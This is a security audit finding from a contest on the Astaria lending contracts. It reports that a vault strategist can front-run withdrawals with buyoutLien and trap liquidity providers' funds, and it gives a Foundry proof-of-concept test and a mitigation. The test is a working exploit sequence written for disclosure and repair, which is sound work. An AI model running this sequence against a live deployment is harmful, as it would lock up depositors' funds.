## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- downgraded by judge
- satisfactory
- selected for report
- sponsor confirmed
- M-18

# [Public vault owner (strategist) can use buyoutLien to indefinitely prevent liquidity providers from withdrawing](https://github.com/code-423n4/2023-01-astaria-findings/issues/324) 

# Lines of code

https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L313-L351


# Vulnerability details

## Impact
By calling buyoutLien before transferWithdrawReserve() is invoked (front-run if necessary), Public vault owner (strategist) can indefinitely prevent liquidity providers from withdrawing. He now effectively owns all the fund in the public vault.

## Proof of Concept
https://github.com/code-423n4/2023-01-astaria/blob/main/src/VaultImplementation.sol#L295
https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L421
Before commitLien, transferWithdrawReserve() is invoked to transfer available funds from the public vault to the withdrawProxy of the previous epoch. However, this is not the case for buyoutLien. 
https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L372-L382
As soon as there's fund is available in the vault, the strategist can call buyoutLien before any calls to transferWithdrawReserve(), and the withdrawProxy will need to continue to wait for available fund.
The only thing that can break this cycle is a liquidation, but the strategist can prevent this from happening by only buying out liens from vaults he control where he only lends out to himself.

Consider the following test. Even though there is enough fund in the vault for the liquidity provider's withdrawal (60 ether), only less than 20 ethers ended up in the withdrawProxy when transferWithdrawReserve() is preceeded by buyoutLien().
```
pragma solidity =0.8.17;

import "forge-std/Test.sol";

import {Authority} from "solmate/auth/Auth.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
import {MockERC721} from "solmate/test/utils/mocks/MockERC721.sol";
import {
  MultiRolesAuthority
} from "solmate/auth/authorities/MultiRolesAuthority.sol";

import {ERC721} from "gpl/ERC721.sol";
import {SafeCastLib} from "gpl/utils/SafeCastLib.sol";

import {IAstariaRouter, AstariaRouter} from "../AstariaRouter.sol";
import {VaultImplementation} from "../VaultImplementation.sol";
import {PublicVault} from "../PublicVault.sol";
import {TransferProxy} from "../TransferProxy.sol";
import {WithdrawProxy} from "../WithdrawProxy.sol";

import {Strings2} from "./utils/Strings2.sol";

import "./TestHelpers.t.sol";
import {OrderParameters} from "seaport/lib/ConsiderationStructs.sol";

contract AstariaTest is TestHelpers {
  using FixedPointMathLib for uint256;
  using CollateralLookup for address;
  using SafeCastLib for uint256;

  event NonceUpdated(uint256 nonce);
  event VaultShutdown();

  function testBuyoutBeforeWithdraw() public {
    TestNFT nft = new TestNFT(1);
    address tokenContract = address(nft);
    uint256 tokenId = uint256(0);

    address publicVault = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 7 days
    });
    _lendToVault(
      Lender({addr: address(1), amountToLend: 60 ether}),
      publicVault
    );

    address publicVault2 = _createPublicVault({
      strategist: strategistOne,
      delegate: strategistTwo,
      epochLength: 7 days
    });
    _lendToVault(
      Lender({addr: address(1), amountToLend: 60 ether}),
      publicVault2
    );

    (, ILienToken.Stack[] memory stack) = _commitToLien({
      vault: publicVault,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: standardLienDetails,
      amount: 40 ether,
      isFirstLien: true
    });

    vm.warp(block.timestamp + 3 days);

    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
      vault: publicVault2,
      strategist: strategistOne,
      strategistPK: strategistOnePK,
      tokenContract: tokenContract,
      tokenId: tokenId,
      lienDetails: ILienToken.Details({
        maxAmount: 50 ether,
        rate: (uint256(1e16) * 70) / (365 days),
        duration: 25 days,
        maxPotentialDebt: 53 ether,
        liquidationInitialAsk: 500 ether
      }),
      amount: 10 ether,
      stack: stack
    });

    _signalWithdraw(address(1), publicVault2);
    _warpToEpochEnd(publicVault2);
    PublicVault(publicVault2).processEpoch();

    
    VaultImplementation(publicVault2).buyoutLien(
      stack,
      uint8(0),
      refinanceTerms
    );
    

    PublicVault(publicVault2).transferWithdrawReserve();

    WithdrawProxy withdrawProxy = PublicVault(publicVault2).getWithdrawProxy(0);

    assertTrue(WETH9.balanceOf(address(withdrawProxy)) < 20 ether);
    
  }
}
```

## Tools Used
VSCode, Foundry

## Recommended Mitigation Steps
Enforce a call to transferWithdrawReserve() before a buyout executes (similar to commitLien)